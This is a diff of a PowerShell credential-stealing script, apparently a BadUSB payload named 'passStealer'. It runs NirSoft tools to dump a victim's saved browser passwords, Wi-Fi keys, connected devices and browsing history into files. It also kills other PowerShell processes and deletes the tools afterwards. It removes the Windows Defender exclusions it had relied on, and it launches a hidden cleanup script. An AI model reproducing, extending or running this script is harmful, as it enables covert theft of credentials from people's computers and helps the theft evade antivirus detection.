@@ -16,29 +16,23 @@ $destinationUnzipPath = "/dump"
 $command = "& $7ZipPath e -o$destinationUnzipPath -y -tzip -p$zipFilePassword $zipFile"
 Invoke-Expression $command
 Set-Location /dump #Go to dump directory
-.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_passwords.txt #Create the file for Browser passwords
-.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_wifi.txt #Create the file for WiFi passwords
-.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_connected_devices.txt #Create the file for connected devices
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_history.txt #Create the file for Browser history
+.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
+.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt #Create the file for WiFi passwords
+.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt #Create the file for connected devices
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt #Create the file for Browser history
 Start-Sleep -Seconds 60 #Wait 5 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 10 #Wait 10 seconds
 #Delete nirsoft tools and .ps1 file
 Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
+Remove-Item BrowsingHistoryView.exe
+Remove-Item WNetWatcher.exe
+Remove-Item WNetWatcher.cfg
 Remove-Item tools
-#Enable and disable capslock to know when you can eject BadUSB
-$keyBoardObject = New-Object -ComObject WScript.Shell
-$keyBoardObject.SendKeys("{CAPSLOCK}")
-Start-Sleep -Seconds 1 #Wait 2 seconds
-$keyBoardObject.SendKeys("{CAPSLOCK}")
-Start-Sleep -Seconds 1 #Wait 2 seconds
-$keyBoardObject.SendKeys("{CAPSLOCK}")
-Start-Sleep -Seconds 1 #Wait 2 seconds
-$keyBoardObject.SendKeys("{CAPSLOCK}")
 Remove-MpPreference -ExclusionPath /dump
 Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
 Set-Location /passStealer
-powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
+powershell.exe -noexit -windowstyle hidden -file fin_storage.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
 exit #End .ps1 file
